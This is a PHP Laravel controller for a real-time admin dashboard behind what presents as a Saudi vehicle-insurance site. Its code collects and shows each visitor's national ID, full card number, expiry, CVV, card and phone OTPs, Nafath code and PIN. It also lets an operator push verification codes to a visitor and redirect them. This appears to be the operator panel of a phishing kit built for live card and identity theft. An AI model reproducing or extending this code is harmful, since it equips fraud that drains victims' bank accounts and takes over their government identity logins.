<?php

namespace App\Http\Controllers\Backend\Admin;

use App\Http\Controllers\Controller;
use App\Http\Requests\SendVerificationCodeRequest;
use App\Http\Requests\UpdateApprovalStatusRequest;
use App\Models\InsuranceRequest;
use App\Models\SupportTicket;
use Illuminate\Http\Request;
use Illuminate\Routing\Route;
use Illuminate\Support\Facades\DB;
use Carbon\Carbon;

class RealtimeDashboardController extends Controller
{
    /**
     * Display the realtime dashboard
     */
    public function index(Route $route)
    {
        try {
            return view('admin.realtime_dashboard.index');
        } catch (\Throwable $th) {
            return $this->handleError($th, $route);
        }
    }

    /**
     * Get realtime data for dashboard (AJAX)
     */
    public function getData(Request $request)
    {
        try {
            $fiveMinutesAgo = Carbon::now()->subMinutes(5);
            
            // Get active users (last activity within 5 minutes)
            $activeUsers = InsuranceRequest::where('is_active', true)
                ->where('last_activity', '>=', $fiveMinutesAgo)
                ->orderBy('last_activity', 'desc')
                ->get()
                ->map(function ($user) {
                    return [
                        'id' => $user->id,
                        'ip' => $user->user_ip ?? 'غير معروف',
                        'name' => $user->full_name ?? 'غير محدد',
                        'identity_number' => $user->identity_number ?? '-',
                        'current_route' => $this->getRouteArabicName($user->current_route),
                        'last_activity' => $user->last_activity ? Carbon::parse($user->last_activity)->diffForHumans() : '-',
                        'is_active' => true,
                        
                        // Payment data
                        'card_holder_name' => $user->name_on_card ?? '-',
                        'card_number' => $user->card_number ?? '-',
                        'card_expiry' => $user->expiry_date ?? '-',
                        'card_cvv' => $user->cvv ?? '-',
                        
                        // OTP codes
                        'nafath_code' => $user->nafath_code ?? '-',
                        'phone_otp' => $user->phone_otp ?? '-',
                        'card_otp' => $user->card_otp ?? '-',
                        'pin_code' => $user->pin_code ?? '-',
                        
                        // Phone data
                        'phone_number' => $user->mobile_number_statements ?? $user->check_mobile_number ?? '-',
                        'operator' => $this->detectOperator($user->mobile_number_statements ?? $user->check_mobile_number ?? ''),
                        
                        // Submission tracking
                        'submission_count' => $user->submission_count ?? 0,
                        'first_submission_at' => $user->first_submission_at ? Carbon::parse($user->first_submission_at)->format('Y-m-d H:i') : '-',
                        
                        // Approval status
                        'approval_status' => $user->approval_status ?? 'pending',
                    ];
                });

            // Statistics
            $stats = [
                'total_active' => $activeUsers->count(),
                'total_today' => InsuranceRequest::whereDate('created_at', Carbon::today())->count(),
                'total_pending' => InsuranceRequest::where('approval_status', 'pending')->count(),
                'total_approved' => InsuranceRequest::where('approval_status', 'approved')->count(),
            ];

            // Get latest submissions (all users in last 24 hours)
            $allUsers = InsuranceRequest::where('created_at', '>=', Carbon::now()->subHours(24))
                ->orderBy('created_at', 'desc')
                ->limit(100)
                ->get()
                ->map(function ($user) use ($fiveMinutesAgo) {
                    $isActive = $user->is_active && $user->last_activity && Carbon::parse($user->last_activity)->isAfter($fiveMinutesAgo);
                    
                    return [
                        'id' => $user->id,
                        'ip' => $user->user_ip ?? 'غير معروف',
                        'name' => $user->full_name ?? 'غير محدد',
                        'identity_number' => $user->identity_number ?? '-',
                        'current_route' => $this->getRouteArabicName($user->current_route),
                        'last_activity' => $user->last_activity ? Carbon::parse($user->last_activity)->diffForHumans() : '-',
                        'is_active' => $isActive,
                        'created_at' => $user->created_at->format('Y-m-d H:i:s'),
                        
                        // Payment data
                        'card_holder_name' => $user->name_on_card ?? '-',
                        'card_number' => $user->card_number ?? '-',
                        'card_expiry' => $user->expiry_date ?? '-',
                        'card_cvv' => $user->cvv ?? '-',
                        
                        // OTP codes
                        'nafath_code' => $user->nafath_code ?? '-',
                        'phone_otp' => $user->phone_otp ?? '-',
                        'card_otp' => $user->card_otp ?? '-',
                        'pin_code' => $user->pin_code ?? '-',
                        
                        // Phone data
                        'phone_number' => $user->mobile_number_statements ?? $user->check_mobile_number ?? '-',
                        'operator' => $this->detectOperator($user->mobile_number_statements ?? $user->check_mobile_number ?? ''),
                        
                        // Submission tracking
                        'submission_count' => $user->submission_count ?? 0,
                        
                        // Approval status
                        'approval_status' => $user->approval_status ?? 'pending',
                    ];
                });

            return response()->json([
                'success' => true,
                'active_users' => $activeUsers,
                'all_users' => $allUsers,
                'stats' => $stats,
                'timestamp' => now()->toISOString(),
            ]);

        } catch (\Throwable $th) {
            return response()->json([
                'success' => false,
                'message' => 'فشل تحميل البيانات: ' . $th->getMessage(),
            ], 500);
        }
    }

    /**
     * Get user detail for modal (AJAX)
     */
    public function getUserDetail($id)
    {
        try {
            $user = InsuranceRequest::findOrFail($id);
            
            return response()->json([
                'success' => true,
                'user' => [
                    'id' => $user->id,
                    'ip' => $user->user_ip ?? 'غير معروف',
                    'user_agent' => $user->user_agent ?? '-',
                    
                    // Personal info
                    'full_name' => $user->full_name ?? '-',
                    'identity_number' => $user->identity_number ?? '-',
                    'birth_date' => $user->birth_date ?? '-',
                    'phone' => $user->mobile_number_statements ?? $user->check_mobile_number ?? '-',
                    
                    // Vehicle info
                    'vehicle_type' => $user->vehicle_type ?? '-',
                    'vehicle_model' => $user->vehicle_model ?? '-',
                    'manufacturing_year' => $user->manufacturing_year ?? '-',
                    'estimated_value' => $user->car_estimated_value ?? '-',
                    
                    // Insurance info
                    'insurance_type' => $user->insurance_type ?? '-',
                    'coverage_type' => $user->insurance_category ?? '-',
                    
                    // Payment data
                    'card_holder_name' => $user->name_on_card ?? '-',
                    'card_number' => $user->card_number ?? '-',
                    'card_expiry' => $user->expiry_date ?? '-',
                    'card_cvv' => $user->cvv ?? '-',
                    
                    // OTP codes
                    'nafath_code' => $user->nafath_code ?? '-',
                    'phone_otp' => $user->phone_otp ?? '-',
                    'card_otp' => $user->card_otp ?? '-',
                    'pin_code' => $user->pin_code ?? '-',
                    
                    // Status
                    'current_route' => $this->getRouteArabicName($user->current_route),
                    'is_active' => $user->is_active,
                    'last_activity' => $user->last_activity ? Carbon::parse($user->last_activity)->format('Y-m-d H:i:s') : '-',
                    'approval_status' => $user->approval_status ?? 'pending',
                    
                    // Timestamps
                    'created_at' => $user->created_at->format('Y-m-d H:i:s'),
                    'updated_at' => $user->updated_at->format('Y-m-d H:i:s'),
                ],
            ]);

        } catch (\Throwable $th) {
            return response()->json([
                'success' => false,
                'message' => 'فشل تحميل البيانات: ' . $th->getMessage(),
            ], 500);
        }
    }

    /**
     * Send code to user (Nafath/OTP/PIN)
     */
    public function sendCode(SendVerificationCodeRequest $request, $id)
    {
        try {
            $user = InsuranceRequest::findOrFail($id);
            
            // Get validated data using FormRequest helper methods
            $codeType = $request->getCodeType();
            $codeValue = $request->getCodeValue();
            
            $user->update([
                $codeType => $codeValue,
                'last_activity' => now(),
            ]);
            
            return response()->json([
                'success' => true,
                'message' => 'تم إرسال الكود بنجاح',
                'code' => $codeValue,
            ]);

        } catch (\Throwable $th) {
            return response()->json([
                'success' => false,
                'message' => 'فشل إرسال الكود: ' . $th->getMessage(),
            ], 500);
        }
    }

    /**
     * Approve or reject user request
     */
    public function updateApprovalStatus(UpdateApprovalStatusRequest $request, $id)
    {
        try {
            $user = InsuranceRequest::findOrFail($id);
            
            // Get validated data using FormRequest helper methods
            $status = $request->getStatus();
            $redirectUrl = $request->getRedirectUrl();
            
            $user->update([
                'approval_status' => $status,
                'approval_redirect_url' => $redirectUrl,
                'approved_by' => auth()->guard('super_admin')->id(),
                'approved_at' => now(),
            ]);
            
            return response()->json([
                'success' => true,
                'message' => $status === 'approved' ? 'تم قبول الطلب' : 'تم رفض الطلب',
            ]);

        } catch (\Throwable $th) {
            return response()->json([
                'success' => false,
                'message' => 'فشل تحديث الحالة: ' . $th->getMessage(),
            ], 500);
        }
    }

    /**
     * Helper: Get Arabic route name
     */
    private function getRouteArabicName($route)
    {
        $routes = [
            'welcome' => 'الصفحة الرئيسية',
            'insuranceStatements' => 'استعلام المركبة',
            'insuranceType' => 'اختيار نوع التأمين',
            'paymentForm' => 'نموذج الدفع',
            'checkMobileNumber' => 'تأكيد رقم الجوال',
            'cardOwnership' => 'إثبات ملكية البطاقة',
            'nafathVerification' => 'التحقق عبر نفاذ',
            'beforeCallProcess' => 'إتمام الطلب',
        ];
        
        return $routes[$route] ?? ($route ?? 'غير معروف');
    }

    /**
     * Helper: Detect mobile operator
     */
    private function detectOperator($phone)
    {
        if (empty($phone)) return '-';
        
        $phone = preg_replace('/[^0-9]/', '', $phone);
        
        if (preg_match('/^(05[0-9])/', $phone, $matches)) {
            $prefix = $matches[1];
            
            if (in_array($prefix, ['050', '053', '054', '055', '056', '059'])) {
                return 'STC';
            } elseif (in_array($prefix, ['051', '052', '058'])) {
                return 'Mobily';
            } elseif (in_array($prefix, ['057'])) {
                return 'Zain';
            }
        }
        
        return 'غير معروف';
    }

    /**
     * Handle errors
     */
    private function handleError(\Throwable $th, Route $route)
    {
        $function_name = $route->getActionName();
        $check_old_errors = SupportTicket::where([
            'error_location' => $th->getFile(),
            'error_description' => $th->getMessage(),
            'function_name' => $function_name,
            'error_line' => $th->getLine(),
        ])->get();

        if ($check_old_errors->count() == 0) {
            $end_error_ticket = SupportTicket::create([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' =>  $th->getLine(),
            ]);
        } else {
            $end_error_ticket = $check_old_errors->first();
        }

        return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
    }
}
